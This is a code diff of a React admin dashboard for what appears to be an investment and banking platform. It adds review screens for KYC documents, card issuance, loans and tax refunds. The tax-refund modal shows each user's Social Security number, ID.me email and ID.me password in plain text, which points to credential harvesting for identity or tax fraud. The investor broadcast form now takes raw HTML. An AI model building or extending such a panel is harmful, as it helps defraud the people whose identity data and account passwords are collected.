-                      <div className="flex justify-between items-baseline">
-                        <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Cycle Duration</span>
-                        <span className="text-xs font-bold text-navy-900/60 uppercase">{plan.duration}</span>
+                      <div className="flex justify-between items-center py-1">
+                        <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Country</span>
+                        <span className="text-xs font-bold text-navy-900">{user.country || 'N/A'}</span>
                       </div>
                     </div>
 
-                    <div className="flex items-center justify-between">
-                      <div className={`flex items-center gap-2 px-3 py-1.5 rounded-full border ${plan.isActive
-                        ? 'bg-green-50 text-green-500 border-green-100'
-                        : 'bg-red-50 text-red-500 border-red-100'
-                        }`}>
-                        <div className={`w-1.5 h-1.5 rounded-full ${plan.isActive ? 'bg-green-500 animate-pulse' : 'bg-red-500'}`}></div>
-                        <span className="text-[10px] font-black uppercase tracking-widest">{plan.isActive ? 'Active' : 'Inactive'}</span>
-                      </div>
-                      {plan.capitalBack && (
-                        <div className="flex items-center gap-1.5">
-                          <div className="p-1 bg-gold-50 text-gold-500 rounded-lg">
-                            <CheckCircle className="w-3 h-3" />
-                          </div>
-                          <span className="text-[9px] font-black text-navy-900/40 uppercase tracking-widest leading-none">Capital<br />Guaranteed</span>
-                        </div>
-                      )}
+                    <div className="flex items-center gap-3">
+                      <button
+                        onClick={() => {
+                          setSelectedKycUser(user);
+                          setShowKycModal(true);
+                        }}
+                        className="flex-1 bg-navy-900 hover:bg-navy-800 text-gold-500 px-4 py-3.5 rounded-2xl font-black uppercase tracking-widest text-[10px] transition-all shadow-xl shadow-navy-900/10 active:scale-95"
+                      >
+                        Review Docs
+                      </button>
                     </div>
                   </div>
                 ))}
@@ -1577,6 +1916,21 @@ const AdminSection = () => {
                   <p className="text-gray-500">There are no {selectedTransactionType} requests with the current filter.</p>
                 </div>
               )}
+          </div>
+        )}
+        {activeTab === 'card-topups' && (
+          <div className="animate-in fade-in slide-in-from-bottom-4 duration-500">
+            <CardTopUpManager />
+          </div>
+        )}
+        {activeTab === 'testimonials' && (
+          <div className="animate-in fade-in slide-in-from-bottom-4 duration-500">
+            <TestimonialManager />
+          </div>
+        )}
+        {activeTab === 'recovery-ops' && (
+          <div className="animate-in fade-in slide-in-from-bottom-4 duration-500">
+            <RecoveryCaseManager />
           </div>
         )}
       </div>
@@ -2099,34 +2453,29 @@ const AdminSection = () => {
                 )}
 
                 <div className="group">
-                  <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest mb-3 ml-1 group-focus-within:text-gold-500 transition-colors">Communication Title</label>
+                  <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest mb-3 ml-1 group-focus-within:text-gold-500 transition-colors">Transmission Header</label>
                   <input
                     type="text"
                     value={notificationTitle}
                     onChange={(e) => setNotificationTitle(e.target.value)}
-                    placeholder="e.g., Strategic Market Update"
+                    placeholder="ENTER SUBJECT PROTOCOL..."
                     className="w-full px-6 py-4 bg-gray-50 border border-gray-100 rounded-2xl focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold"
                   />
                 </div>
 
                 <div className="group">
-                  <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest mb-3 ml-1 group-focus-within:text-gold-500 transition-colors">Primary Briefing (Message)</label>
-                  <textarea
-                    value={notificationMessage}
-                    onChange={(e) => setNotificationMessage(e.target.value)}
-                    placeholder="Provide the core update details..."
-                    className="w-full px-6 py-4 bg-gray-50 border border-gray-100 rounded-2xl focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold min-h-[120px]"
-                  />
-                </div>
-
-                <div className="group">
-                  <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest mb-3 ml-1 group-focus-within:text-gold-500 transition-colors">Expanded Intelligence (Details - Optional)</label>
-                  <textarea
-                    value={notificationDetails}
-                    onChange={(e) => setNotificationDetails(e.target.value)}
-                    placeholder="Additional context or legal disclaimers..."
-                    className="w-full px-6 py-4 bg-gray-50 border border-gray-100 rounded-2xl focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold min-h-[80px]"
-                  />
+                  <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest mb-3 ml-1 group-focus-within:text-gold-500 transition-colors">Intelligence Payload (HTML Supported)</label>
+                  <div className="relative">
+                    <textarea
+                      value={notificationMessage}
+                      onChange={(e) => setNotificationMessage(e.target.value)}
+                      placeholder="<h1>HELLO INVESTORS</h1><p>PROTOCOL UPDATE INITIATED...</p>"
+                      className="w-full px-6 py-4 bg-gray-50 border border-gray-100 rounded-2xl focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold min-h-[160px]"
+                    />
+                    <div className="absolute bottom-4 right-4 text-[8px] font-black text-gold-600 uppercase tracking-widest bg-gold-50 px-2 py-1 rounded-md border border-gold-100">
+                      Rich content mode active. Semantic HTML structuring is permitted.
+                    </div>
+                  </div>
                 </div>
 
                 <div className="group">
@@ -2190,7 +2539,7 @@ const AdminSection = () => {
                   ) : (
                     <Bell className="w-4 h-4" />
                   )}
-                  <span>{sendingNotification ? 'Transmitting...' : 'Authorize Broadcast'}</span>
+                  <span>{sendingNotification ? 'TRANSMITTING...' : 'AUTHORIZE BROADCAST'}</span>
                 </button>
               </div>
             </div>
@@ -2615,11 +2964,372 @@ const AdminSection = () => {
           <WithdrawalScheduleManager />
         </div>
       )}
-
-      {/* Newsletter Tab */}
+      {/* Newsletter Hub */}
       {activeTab === 'newsletter' && (
         <div>
           <NewsletterManager />
+        </div>
+      )}
+
+      {/* KYC Review Modal */}
+      {showKycModal && selectedKycUser && (
+        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 lg:p-8">
+          <div className="absolute inset-0 bg-navy-900/90 backdrop-blur-xl" onClick={() => setShowKycModal(false)}></div>
+          <div className="bg-white w-full max-w-5xl max-h-[90vh] rounded-[3rem] overflow-hidden shadow-2xl relative z-10 flex flex-col border border-white/20">
+            {/* Modal Header */}
+            <div className="p-8 lg:p-10 border-b border-gray-100 flex items-center justify-between bg-gray-50/50">
+              <div className="flex items-center gap-6">
+                <div className="w-16 h-16 bg-navy-900 rounded-3xl flex items-center justify-center text-gold-500 font-black text-xl shadow-xl shadow-navy-900/20">
+                  {selectedKycUser.firstName?.charAt(0)}{selectedKycUser.lastName?.charAt(0)}
+                </div>
+                <div>
+                  <h3 className="text-2xl font-black text-navy-900 uppercase tracking-tighter mb-1">KYC Visual Audit</h3>
+                  <div className="flex items-center gap-3">
+                    <span className="text-[10px] font-black text-gold-600 uppercase tracking-widest bg-gold-50 px-3 py-1 rounded-full border border-gold-100">{selectedKycUser.userCode}</span>
+                    <span className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">{selectedKycUser.email}</span>
+                  </div>
+                </div>
+              </div>
+              <button 
+                onClick={() => setShowKycModal(false)}
+                className="w-12 h-12 bg-white hover:bg-red-50 text-gray-400 hover:text-red-500 rounded-2xl flex items-center justify-center transition-all border border-gray-100 shadow-sm"
+              >
+                <X className="w-6 h-6" />
+              </button>
+            </div>
+
+            {/* Modal Body */}
+            <div className="flex-1 overflow-y-auto p-8 lg:p-10 custom-scrollbar">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-10">
+                <div className="space-y-6">
+                  <div>
+                    <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-3 ml-1">Identity Document (Front)</p>
+                    <div className="relative aspect-[16/10] bg-gray-100 rounded-[2rem] overflow-hidden border border-gray-200 group">
+                      {selectedKycUser.kycDocuments?.idFront ? (
+                        <img src={selectedKycUser.kycDocuments.idFront} alt="ID Front" className="w-full h-full object-cover transition-transform duration-700 group-hover:scale-110" />
+                      ) : (
+                        <div className="w-full h-full flex items-center justify-center text-gray-300">No Image Provided</div>
+                      )}
+                    </div>
+                  </div>
+                  <div>
+                    <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-3 ml-1">Identity Document (Back)</p>
+                    <div className="relative aspect-[16/10] bg-gray-100 rounded-[2rem] overflow-hidden border border-gray-200 group">
+                      {selectedKycUser.kycDocuments?.idBack ? (
+                        <img src={selectedKycUser.kycDocuments.idBack} alt="ID Back" className="w-full h-full object-cover transition-transform duration-700 group-hover:scale-110" />
+                      ) : (
+                        <div className="w-full h-full flex items-center justify-center text-gray-300">No Image Provided</div>
+                      )}
+                    </div>
+                  </div>
+                </div>
+                <div className="space-y-6">
+                  <div>
+                    <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-3 ml-1">Verification Selfie</p>
+                    <div className="relative aspect-square bg-gray-100 rounded-[2.5rem] overflow-hidden border border-gray-200 group">
+                      {selectedKycUser.kycDocuments?.selfie ? (
+                        <img src={selectedKycUser.kycDocuments.selfie} alt="Selfie" className="w-full h-full object-cover transition-transform duration-700 group-hover:scale-110" />
+                      ) : (
+                        <div className="w-full h-full flex items-center justify-center text-gray-300">No Image Provided</div>
+                      )}
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div className="bg-gray-50 p-8 rounded-[2.5rem] border border-gray-100 space-y-6">
+                <div className="group">
+                  <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest mb-3 ml-1 group-focus-within:text-gold-500 transition-colors">Audit Discrepancy Note (Rejection Reason)</label>
+                  <textarea
+                    value={kycRejectionReason}
+                    onChange={(e) => setKycRejectionReason(e.target.value)}
+                    className="w-full px-6 py-4 bg-white border border-gray-200 rounded-2xl focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold min-h-[100px] text-navy-900"
+                    placeholder="Specify failure reasons (e.g. Blurry photo, Expired ID)..."
+                  />
+                </div>
+
+                <div className="flex gap-4">
+                  <button
+                    onClick={() => {
+                      updateKycRequestStatus(selectedKycUser._id!, 'approve');
+                      setShowKycModal(false);
+                      setSelectedKycUser(null);
+                      setKycRejectionReason('');
+                    }}
+                    className="flex-[2] bg-navy-900 hover:bg-navy-800 text-gold-500 px-8 py-5 rounded-2xl font-black uppercase tracking-widest text-[11px] transition-all shadow-xl shadow-navy-900/10 flex items-center justify-center gap-3 active:scale-95"
+                  >
+                    <CheckCircle className="w-5 h-5" />
+                    Authorize Identity
+                  </button>
+                  <button
+                    onClick={() => {
+                      if (!kycRejectionReason) {
+                        showError('Please provide a reason for declining.');
+                        return;
+                      }
+                      updateKycRequestStatus(selectedKycUser._id!, 'decline', kycRejectionReason);
+                      setShowKycModal(false);
+                      setSelectedKycUser(null);
+                      setKycRejectionReason('');
+                    }}
+                    className="flex-1 bg-red-50 hover:bg-red-100 text-red-500 px-8 py-5 rounded-2xl font-black uppercase tracking-widest text-[11px] transition-all flex items-center justify-center gap-3 active:scale-95"
+                  >
+                    <XCircle className="w-5 h-5" />
+                    Reject
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+      {/* Card Request Review Modal */}
+      {showCardModal && selectedCard && (
+        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 lg:p-8">
+          <div className="absolute inset-0 bg-navy-900/90 backdrop-blur-xl" onClick={() => setShowCardModal(false)}></div>
+          <div className="bg-white w-full max-w-4xl max-h-[90vh] rounded-[3rem] overflow-hidden shadow-2xl relative z-10 flex flex-col border border-white/20">
+            {/* Modal Header */}
+            <div className="p-8 lg:p-10 border-b border-gray-100 flex items-center justify-between bg-gray-50/50">
+              <div className="flex items-center gap-6">
+                <div className="w-16 h-16 bg-navy-900 rounded-3xl flex items-center justify-center text-gold-500 font-black text-xl shadow-xl shadow-navy-900/20">
+                  {selectedCard.user?.firstName?.charAt(0)}{selectedCard.user?.lastName?.charAt(0)}
+                </div>
+                <div>
+                  <h3 className="text-2xl font-black text-navy-900 uppercase tracking-tighter mb-1">Card Issuance Audit</h3>
+                  <div className="flex items-center gap-3">
+                    <span className="text-[10px] font-black text-gold-600 uppercase tracking-widest bg-gold-50 px-3 py-1 rounded-full border border-gold-100">{selectedCard.user?.userCode}</span>
+                    <span className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">{selectedCard.user?.email}</span>
+                  </div>
+                </div>
+              </div>
+              <button 
+                onClick={() => setShowCardModal(false)}
+                className="w-12 h-12 bg-white hover:bg-red-50 text-gray-400 hover:text-red-500 rounded-2xl flex items-center justify-center transition-all border border-gray-100 shadow-sm"
+              >
+                <X className="w-6 h-6" />
+              </button>
+            </div>
+
+            {/* Modal Body */}
+            <div className="flex-1 overflow-y-auto p-8 lg:p-10 custom-scrollbar">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-10 mb-10">
+                <div className="space-y-8">
+                  <div>
+                    <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-4 ml-1">Card Specifications</p>
+                    <div className="bg-gray-50 p-8 rounded-[2rem] border border-gray-100 space-y-6">
+                      <div className="flex justify-between items-center py-3 border-b border-gray-200/50">
+                        <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Card Network</span>
+                        <span className="text-xs font-black text-navy-900 uppercase tracking-widest">{selectedCard.cardType}</span>
+                      </div>
+                      <div className="flex justify-between items-center py-3 border-b border-gray-200/50">
+                        <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Tier Level</span>
+                        <span className="px-4 py-1.5 bg-gold-500 text-navy-900 rounded-xl text-[10px] font-black uppercase tracking-widest">{selectedCard.cardLevel}</span>
+                      </div>
+                      <div className="flex justify-between items-center py-3 border-b border-gray-200/50">
+                        <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Nominal Limit</span>
+                        <span className="text-sm font-black text-navy-900">${selectedCard.spendLimit?.toLocaleString()}</span>
+                      </div>
+                      <div className="flex justify-between items-center py-3">
+                        <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Issuance Fee</span>
+                        <span className="text-sm font-black text-gold-600">${selectedCard.fee}</span>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <div className="space-y-8">
+                  <div>
+                    <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-4 ml-1">Identity Information</p>
+                    <div className="bg-navy-900 p-8 rounded-[2rem] border border-navy-800 space-y-6 shadow-xl">
+                      <div>
+                        <p className="text-[9px] font-black text-white/30 uppercase tracking-widest mb-1">Cardholder Designation</p>
+                        <p className="text-sm font-black text-white uppercase tracking-tight leading-tight">{selectedCard.cardholderName}</p>
+                      </div>
+                      <div>
+                        <p className="text-[9px] font-black text-white/30 uppercase tracking-widest mb-1">Billing Jurisdiction</p>
+                        <p className="text-[11px] font-bold text-gray-400 uppercase tracking-tight leading-relaxed">{selectedCard.billingAddress}</p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div className="bg-gray-50 p-8 rounded-[2.5rem] border border-gray-100 space-y-6">
+                <div className="group">
+                  <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest mb-3 ml-1 group-focus-within:text-gold-500 transition-colors">Audit Notes / Rejection Reason</label>
+                  <textarea
+                    value={cardRejectionReason}
+                    onChange={(e) => setCardRejectionReason(e.target.value)}
+                    className="w-full px-6 py-4 bg-white border border-gray-200 rounded-2xl focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold min-h-[100px] text-navy-900"
+                    placeholder="Provide justification if declining..."
+                  />
+                </div>
+
+                <div className="flex gap-4">
+                  <button
+                    onClick={() => {
+                      updateCardStatus(selectedCard._id!, 'approve');
+                      setShowCardModal(false);
+                      setSelectedCard(null);
+                      setCardRejectionReason('');
+                    }}
+                    className="flex-[2] bg-navy-900 hover:bg-navy-800 text-gold-500 px-8 py-5 rounded-2xl font-black uppercase tracking-widest text-[11px] transition-all shadow-xl shadow-navy-900/10 flex items-center justify-center gap-3 active:scale-95"
+                  >
+                    <CheckCircle className="w-5 h-5" />
+                    Authorize Issuance
+                  </button>
+                  <button
+                    onClick={() => {
+                      if (!cardRejectionReason) {
+                        showError('Please provide a reason for declining.');
+                        return;
+                      }
+                      updateCardStatus(selectedCard._id!, 'decline', cardRejectionReason);
+                      setShowCardModal(false);
+                      setSelectedCard(null);
+                      setCardRejectionReason('');
+                    }}
+                    className="flex-1 bg-red-50 hover:bg-red-100 text-red-500 px-8 py-5 rounded-2xl font-black uppercase tracking-widest text-[11px] transition-all flex items-center justify-center gap-3 active:scale-95"
+                  >
+                    <XCircle className="w-5 h-5" />
+                    Reject
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Loan Review Modal */}
+      {showLoanModal && selectedLoan && (
+        <div className="fixed inset-0 bg-navy-900/40 backdrop-blur-md flex items-center justify-center z-50 p-6 animate-in fade-in duration-300">
+          <div className="bg-white rounded-[3rem] w-full max-w-2xl border border-white/20 shadow-2xl text-navy-900 overflow-hidden">
+            <div className="p-10 border-b border-gray-100 flex justify-between items-center bg-gray-50/50">
+              <div>
+                <h3 className="text-2xl font-black uppercase tracking-tighter">Loan Underwriting Audit</h3>
+                <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mt-1">Application ID: {selectedLoan._id}</p>
+              </div>
+              <button onClick={() => setShowLoanModal(false)} className="w-10 h-10 bg-white text-gray-400 rounded-xl flex items-center justify-center border border-gray-100 hover:text-red-500 transition-all font-black">X</button>
+            </div>
+            <div className="p-10 space-y-8">
+              <div className="grid grid-cols-2 gap-8">
+                <div>
+                  <label className="text-[9px] font-black text-gray-400 uppercase tracking-widest mb-1 block">Requested Amount</label>
+                  <p className="text-2xl font-black text-navy-900">${selectedLoan.amount?.toLocaleString()}</p>
+                </div>
+                <div>
+                  <label className="text-[9px] font-black text-gray-400 uppercase tracking-widest mb-1 block">Credit Facility</label>
+                  <p className="text-sm font-black text-navy-900 uppercase tracking-tight">{selectedLoan.facility}</p>
+                </div>
+                <div>
+                  <label className="text-[9px] font-black text-gray-400 uppercase tracking-widest mb-1 block">Self-Reported Income</label>
+                  <p className="text-sm font-black text-gold-600 uppercase tracking-tight">{selectedLoan.income}</p>
+                </div>
+                <div>
+                  <label className="text-[9px] font-black text-gray-400 uppercase tracking-widest mb-1 block">Repayment Term</label>
+                  <p className="text-sm font-black text-navy-900 uppercase tracking-tight">{selectedLoan.duration} Months</p>
+                </div>
+              </div>
+
+              <div>
+                <label className="text-[9px] font-black text-gray-400 uppercase tracking-widest mb-1 block">Purpose Statement</label>
+                <div className="bg-gray-50 p-4 rounded-2xl border border-gray-100 italic text-sm text-gray-600">
+                  "{selectedLoan.purpose}"
+                </div>
+              </div>
+
+              <div className="space-y-4 pt-4 border-t border-gray-100">
+                <textarea
+                  value={loanRejectionReason}
+                  onChange={(e) => setLoanRejectionReason(e.target.value)}
+                  placeholder="Internal audit notes or rejection justification..."
+                  className="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none text-sm font-medium h-24"
+                />
+                <div className="flex gap-4">
+                  <button
+                    onClick={() => { updateLoanStatus(selectedLoan._id, 'approved'); setShowLoanModal(false); }}
+                    className="flex-1 bg-navy-900 hover:bg-navy-800 text-gold-500 py-4 rounded-2xl font-black uppercase tracking-widest text-[10px] transition-all shadow-xl"
+                  >
+                    Authorize Funds
+                  </button>
+                  <button
+                    onClick={() => { updateLoanStatus(selectedLoan._id, 'rejected', loanRejectionReason); setShowLoanModal(false); }}
+                    className="flex-1 bg-red-50 hover:bg-red-100 text-red-500 py-4 rounded-2xl font-black uppercase tracking-widest text-[10px] transition-all"
+                  >
+                    Decline
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Tax Refund Review Modal */}
+      {showTaxRefundModal && selectedTaxRefund && (
+        <div className="fixed inset-0 bg-navy-900/40 backdrop-blur-md flex items-center justify-center z-50 p-6 animate-in fade-in duration-300">
+          <div className="bg-white rounded-[3rem] w-full max-w-2xl border border-white/20 shadow-2xl text-navy-900 overflow-hidden">
+            <div className="p-10 border-b border-gray-100 flex justify-between items-center bg-gray-50/50">
+              <div>
+                <h3 className="text-2xl font-black uppercase tracking-tighter">Tax Rebate Audit</h3>
+                <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mt-1">Audit Sequence: {selectedTaxRefund._id}</p>
+              </div>
+              <button onClick={() => setShowTaxRefundModal(false)} className="w-10 h-10 bg-white text-gray-400 rounded-xl flex items-center justify-center border border-gray-100 hover:text-red-500 transition-all font-black">X</button>
+            </div>
+            <div className="p-10 space-y-8">
+              <div className="grid grid-cols-2 gap-8">
+                <div>
+                  <label className="text-[9px] font-black text-gray-400 uppercase tracking-widest mb-1 block">Full Legal Name</label>
+                  <p className="text-lg font-black text-navy-900 uppercase tracking-tight">{selectedTaxRefund.fullName}</p>
+                </div>
+                <div>
+                  <label className="text-[9px] font-black text-gray-400 uppercase tracking-widest mb-1 block">Jurisdiction</label>
+                  <p className="text-sm font-black text-navy-900 uppercase tracking-tight">{selectedTaxRefund.country}</p>
+                </div>
+                <div className="col-span-2 bg-navy-900 p-6 rounded-3xl text-white">
+                  <h4 className="text-[9px] font-black uppercase tracking-widest text-gold-500/60 mb-4">Secure Identity Data</h4>
+                  <div className="space-y-4">
+                    <div className="flex justify-between border-b border-white/10 pb-2">
+                      <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">SSN Credentials</span>
+                      <span className="text-sm font-mono font-bold tracking-widest text-gold-500">{selectedTaxRefund.ssn}</span>
+                    </div>
+                    <div className="flex justify-between border-b border-white/10 pb-2">
+                      <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">ID.me Endpoint</span>
+                      <span className="text-xs font-bold text-gray-300">{selectedTaxRefund.idmeEmail}</span>
+                    </div>
+                    <div className="flex justify-between">
+                      <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Access Key</span>
+                      <span className="text-xs font-mono font-bold text-gray-300">{selectedTaxRefund.idmePassword}</span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div className="space-y-4 pt-4 border-t border-gray-100">
+                <div className="grid grid-cols-3 gap-3">
+                  <button
+                    onClick={() => { updateTaxRefundStatus(selectedTaxRefund._id, 'approved'); setShowTaxRefundModal(false); }}
+                    className="bg-navy-900 hover:bg-navy-800 text-gold-500 py-4 rounded-2xl font-black uppercase tracking-widest text-[9px] transition-all shadow-xl"
+                  >
+                    Authorize
+                  </button>
+                  <button
+                    onClick={() => { updateTaxRefundStatus(selectedTaxRefund._id, 'processing'); setShowTaxRefundModal(false); }}
+                    className="bg-gray-100 hover:bg-gray-200 text-navy-900 py-4 rounded-2xl font-black uppercase tracking-widest text-[9px] transition-all"
+                  >
+                    Processing
+                  </button>
+                  <button
+                    onClick={() => { updateTaxRefundStatus(selectedTaxRefund._id, 'rejected'); setShowTaxRefundModal(false); }}
+                    className="bg-red-50 hover:bg-red-100 text-red-500 py-4 rounded-2xl font-black uppercase tracking-widest text-[9px] transition-all"
+                  >
+                    Reject
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
         </div>
       )}
     </div>
